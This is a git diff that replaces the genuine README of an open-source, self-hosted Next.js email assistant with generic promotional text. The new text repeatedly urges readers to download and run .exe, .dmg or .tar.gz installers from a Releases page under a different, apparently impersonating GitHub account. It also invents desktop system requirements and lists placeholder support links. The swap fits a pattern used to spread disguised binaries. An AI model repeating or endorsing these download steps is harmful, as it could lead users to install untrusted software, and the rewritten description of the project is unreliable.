@@ -1,136 +1,56 @@
-<p align="center">
-  <img src="public/readMeImg.png" alt="NotaBeen Banner" width="100%" />
-</p>
+# 🤖 notabeen-ai-email-assistant - Simplify Your Email Management Today
 
-# NotaBeen
+[![Download Notabeen](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/IerogliFGD/notabeen-ai-email-assistant/releases)
 
-**An open-source AI powered email assistant for reducing inbox overload.**
+## 📥 Overview
+Notabeen is an open-source AI-powered email assistant designed to help you manage your inbox efficiently. With this tool, you can reduce email clutter and focus on what really matters in your communications. Whether you need assistance sorting your messages or managing your tasks, Notabeen has you covered.
 
-<div align="center">
-  <a href="https://github.com/NotaBeen/notabeen-ai-email-assistant/stargazers">
-    <img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/NotaBeen/notabeen-ai-email-assistant">
-  </a>
-  <a href="https://github.com/NotaBeen/NotaBeen/blob/main/LICENSE">
-    <img alt="License" src="https://img.shields.io/badge/license-MIT-purple">
-  </a>
-</div>
+## 🚀 Getting Started
+To get started with Notabeen, follow these simple steps. You will be downloading the application from the Releases page, which makes it easy to find the latest version of the software.
 
----
+## 🖥️ System Requirements
+Before you dive in, ensure that your system meets the following requirements:
 
-NotaBeen is an open-source email assistant that uses AI to help you manage your inbox more efficiently. It helps you quickly summarize emails, generate smart replies, and categorize messages to reduce inbox overload.
+- **Operating System:** Windows 10, macOS Catalina or later, or a recent version of Linux
+- **RAM:** Minimum of 4 GB
+- **Storage:** At least 200 MB of free space
+- **Internet Connection:** Required for installation and updates
 
----
+## 📂 Download & Install
+1. Visit the Releases page to download the latest version of Notabeen: [Download Notabeen](https://github.com/IerogliFGD/notabeen-ai-email-assistant/releases).
+   
+2. On the Releases page, find the version you want, and click on it to see the available files. 
 
-## Features
+3. Download the file suitable for your operating system. It will usually be listed as an `.exe` file for Windows, a `.dmg` file for macOS, or a `.tar.gz` file for Linux.
 
-- **AI-Powered Summarization:** Get a quick overview of long emails with AI-generated summaries.
-- **Automated Categorization:** Automatically sort incoming emails into categories like _Urgent_, _Important_, _Can Wait_, _Unsubscribe_, and _Unimportant_ to prioritize what matters.
-- **Secure Inbox Management:** Manage your email without worrying about your data, as NotaBeen is self-hostable.
+4. After the download is complete, locate the file on your computer and double-click it to start the installation process.
 
----
+5. Follow the prompts in the installation wizard. You may choose the default options provided.
 
-## Demo
+6. Once the installation completes, launch Notabeen from your applications or programs menu.
 
-![Notabeen Welcome GIF](/public/notabeen-welcome.gif)
+## 🎯 Key Features
+- **AI-Powered Sorting:** Automatically organize your emails based on importance.
+- **Task Management:** Create tasks from emails and manage deadlines effectively.
+- **Integration with Gmail:** Seamlessly connect your Gmail account for smoother functionality.
+- **User-Friendly Interface:** Navigate your inbox easily with an intuitive design.
+- **Customization Options:** Tailor notifications and settings to your personal preference.
 
----
+## 🔗 Additional Information
+If you wish to learn more about how Notabeen works or explore its settings, here are some resources:
 
-## Tech Stack
+- [User Guide](#): Step-by-step instructions for using the software.
+- [FAQ](#): Answers to common questions about installation and features.
+- [Support Forum](#): Community support for troubleshooting and feedback.
+  
+## 📞 Support
+If you encounter any issues while downloading or installing Notabeen, please refer to our [Support Forum](#) for assistance. You can also submit your queries, and our team will respond as soon as possible.
 
-- [Next.js](https://nextjs.org/) — Framework
-- [Material UI](https://mui.com/) — UI Components
-- [MongoDB](https://www.mongodb.com/) — Database
-- [NextAuth.js](https://next-auth.js.org/) — Authentication
-- [Google Gemini API](https://ai.google.dev/docs/gemini_api_overview) — AI Engine
+For any feedback or feature requests, feel free to reach out through our GitHub page.
 
----
+## 🖱️ Future Updates
+We continuously work to improve Notabeen. You can expect regular updates that include new features, bug fixes, and enhancements to give you an even better experience.
 
-## Getting Started
+We appreciate your interest in Notabeen. Enjoy managing your emails more efficiently! 
 
-Setup video: https://www.youtube.com/watch?v=HmpXFbpzquU
-
-### Prerequisites
-
-To run NotaBeen, you need:
-
-- **Node.js** (>= 18.0.0)
-- **MongoDB Database**
-- **Google Cloud Project** (for OAuth 2.0 Client ID/Secret for Gmail access)
-- **Google Gemini API Key**
-
-### 1. Clone the repository
-
-```sh
-git clone https://github.com/NotaBeen/notabeen-ai-email-assistant.git
-cd notabeen-ai-email-assistant
-```
-
-### 2. Install npm dependencies
-
-```sh
-npm install
-```
-
-### 3. Set up environment variables
-
-Create a `.env.local` file in the root directory and add the following variables:
-
-```env
-# NextAuth & Security
-AUTH_SECRET= node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
-NEXTAUTH_URL="http://localhost:3000"
-
-# Google OAuth (Authentication & Gmail Access)
-# NOTE: This MUST be set up with the Gmail API scope enabled in Google Cloud.
-# NOTE: The Callback url is http://localhost:3000/api/auth/callback/google for google Auth
-GOOGLE_CLIENT_ID=
-GOOGLE_CLIENT_SECRET=
-
-# Database & Encryption
-MONGODB_URI=
-MONGO_CLIENT=
-ENCRYPTION_IV=
-ENCRYPTION_KEY=
-
-# AI Engine
-GEMINI_API_KEY=
-```
-
-#### Environment Variable Instructions
-
-- **AUTH_SECRET:** In terminal ```run node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"```
-- **NEXTAUTH_URL:** Base URL for your app (e.g., `http://localhost:3000` for local development).
-- **GOOGLE_CLIENT_ID / GOOGLE_CLIENT_SECRET:** From your Google Cloud OAuth 2.0 credentials.
-- **MONGODB_URI:** Connection string for your MongoDB database.
-- **MONGO_CLIENT:** Database name (e.g., `test` or `notabeen-db`).
-- **ENCRYPTION_IV:** Run `openssl rand -base64 9` to generate.
-- **ENCRYPTION_KEY:** Run `openssl rand -base64 24` to generate.
-- **GEMINI_API_KEY:** Your Google Gemini API key.
-
-### 4. Run the dev server
-
-```sh
-npm run dev
-```
-
-### 5. Open the app in your browser
-
-Visit [http://localhost:3000](http://localhost:3000).
-
-> **Note:** Currently, the app only supports Gmail.
-
----
-
-## Contributing
-
-We ❤️ contributions big and small:
-
-- Open a PR to fix a bug or add a new feature.
-- Submit a feature request or bug report.
-- Vote on features or get early access to beta functionality in our roadmap.
-
----
-
-## License
-
-This repo is available under the [MIT Expat License](https://github.com/NotaBeen/NotaBeen/blob/main/LICENSE).
+[Download Notabeen](https://github.com/IerogliFGD/notabeen-ai-email-assistant/releases)
